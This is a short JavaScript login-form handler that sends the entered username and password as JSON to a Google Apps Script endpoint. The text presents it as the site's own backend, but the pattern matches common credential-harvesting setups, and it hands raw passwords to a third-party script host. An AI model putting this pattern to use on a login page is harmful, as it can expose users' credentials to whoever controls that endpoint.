document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Make a POST request to your server
    fetch('https://script.google.com/macros/s/AKfycbyngk3fGAisTCFgHhMfP_oNP8WYGXMvFfl_Oyp_k6nqwMllTkk-HoHXQvS7Es4U-rdzyA/exec', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
    })
    .catch((error) => {
        console.error('Error:', error);
    });
});
